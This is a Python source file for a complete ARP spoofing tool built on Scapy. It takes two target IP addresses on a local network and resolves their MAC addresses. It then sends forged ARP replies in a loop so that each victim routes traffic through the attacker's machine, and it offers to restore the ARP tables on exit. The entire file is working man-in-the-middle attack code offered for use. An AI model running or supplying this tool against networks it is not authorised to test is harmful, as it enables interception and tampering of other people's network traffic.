#!/usr/bin/env python
#
# PYTHON ARP SPOOFER
#
# Author: Matheus Heidemann
#
# Description: this is a ARP spoofer script using Scapy.
#
# 02 August 2022
#
# Version: 1.0.0
#
# License: MIT License


# IMPORTS
import argparse
import re
import subprocess
import sys
from time import sleep
import scapy.all as scapy
from util import helper

# MISC
valid_ipv4_addr = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"


# FUNCTIONS
# Function to get the arguments
def getArguments():

    parser = argparse.ArgumentParser(description="PYTHON ARP SPOOFER - Script to spoof to targets in the same network")
    parser.add_argument("-t", "--target", nargs="*", action="store", help="The two targets distinct IPv4 addresses (Example.: -t 192.168.0.100 192.168.0.200)")
    args = parser.parse_args()

    # If the user passed 2 values to the argument target
    if len(args.target) == 2:
        # Validating the target 1 IPv4
        while True:
            if re.match(valid_ipv4_addr, args.target[0]):
                break
            else:
                args.target[0] = newIPv4(args.target[0], 1)

        # Validating the target 2 IPv4
        while True:
            if re.match(valid_ipv4_addr, args.target[1]):
                break
            else:
                args.target[1] = newIPv4(args.target[1], 2)

        return args

    # If the user didn't passed 2 values to the argument target
    else:
        print("ERROR - You must provide two valid IPv4 address!")
        print("Quitting...")
        quit()


# Function to set a new IPv4 address when the inputed target IPv4 is not valid
def newIPv4(target, index):
    print(f"Invalid target {index} IPv4 ({target}). Please, enter a valid IPv4 address")
    return str(input(f"New target {index} IPv4 > "))


# Function to get the MAC address of the target
def getMACFromTarget(target_ip):
    try:
        arp_request = scapy.ARP(pdst=target_ip)                                         # Creating an ARP resquest with the target's IP
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")                                # ARP destination (Broadcast)
        arp_request_broadcast = broadcast/arp_request                                   # The ARP request broadcast
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]   # Creating a list that only has the ARP responses
        return answered_list[0][1].hwsrc
    except:
        print(f"\nERROR - The IPv4 {target_ip} didn't return any response. Try a different one.")
        print("Quitting...")
        quit()


# Function to get the attacker's machine MAC address
def getAttackerMAC():
    output = subprocess.check_output("ip link show", shell=True).decode()
    return re.search("ether (.+) ", output).group().split()[1].strip()


# Function to create an ARP packet
def createMaliciousPacket(target_ip, spoof_ip):
    return scapy.ARP(
        op=2,
        pdst=target_ip,                         # The IP of the victim that will be fooled
        hwdst=getMACFromTarget(target_ip),      # The MAC address of the victim's machine
        hwsrc=getAttackerMAC(),                 # The MAC address of the attacker's machines
        psrc=spoof_ip)                          # The IP the attacker is pretteding to be


# Function to create an restore ARP packet
def createRestorePacket(target1, target2):
    return scapy.ARP(
        op=2,
        pdst=target1["ip"],
        hwdst=target1["mac"],
        hwsrc=target2["mac"],
        psrc=target2["ip"])

# Function to restore the default ARP tables from the targets


def restoreArpTables(target1, target2):
    restore_packet1 = createRestorePacket(target1, target2)
    restore_packet2 = createRestorePacket(target2, target1)
    scapy.send(restore_packet1, count=4, verbose=False)
    scapy.send(restore_packet2, count=4, verbose=False)
    print("ARP tables restored.")
    print("Quitting the script...")
    quit()


# Function to spoof the targets
def spoofTargets(malicious_packet1, malicious_packet2, packets_per_sec, old_targets_ip_mac):
    try:
        print("\nStarting the spoof...")
        print(f"Sending ARP packets to {malicious_packet1.pdst} and {malicious_packet2.pdst} every {packets_per_sec} seconds.")
        packet_send_count = 0
        while True:
            scapy.send(malicious_packet1, verbose=False)
            scapy.send(malicious_packet2, verbose=False)
            packet_send_count = packet_send_count + 2
            print("\r[+] Sent " + str(packet_send_count) + " packets...",  end="")
            sys.stdout.flush()
            sleep(packets_per_sec)
    except KeyboardInterrupt:
        print("\n\nDetected CTRL + C from the user. Stopping the spoofing!")
        restore = helper.checkStringYesOrNo("Restore the previous ARP tables from the targets? [Y/n] > ", "Y")
        if restore == "Y":
            restoreArpTables(old_targets_ip_mac[0], old_targets_ip_mac[1])
        else:
            print("ARP tables not restored.")
            print("Quitting the script...")
            quit()


# Function to run the program
def run():
    # Check if user is running as sudo or root
    helper.check_privileges()

    # Get the target argument values
    args = getArguments()
    print("")

    # Store the current MAC addresses from the targets IPv4s
    old_targets_ip_mac = []
    for target in args.target:
        target_dict = {"ip": target, "mac": getMACFromTarget(target)}
        old_targets_ip_mac.append(target_dict)

    # Create a new malicious ARP packet and check if the target is listening
    malicious_packet1 = createMaliciousPacket(args.target[0], args.target[1])
    print(f"{args.target[0]} is listening and ready to be spoofed.")

    # Create another malicious ARP packet and check if is the target listening
    malicious_packet2 = createMaliciousPacket(args.target[1], args.target[0])
    print(f"{args.target[1]} is listening and ready to be spoofed.")

    # Define the packets per seconds that should be sent
    packets_per_sec = helper.checkNumInt("\nPacket sending interval (default is 2) > ", 2)

    # Spoof the targets
    spoofTargets(malicious_packet1, malicious_packet2, packets_per_sec, old_targets_ip_mac)


# MAIN
if __name__ == "__main__":
    run()
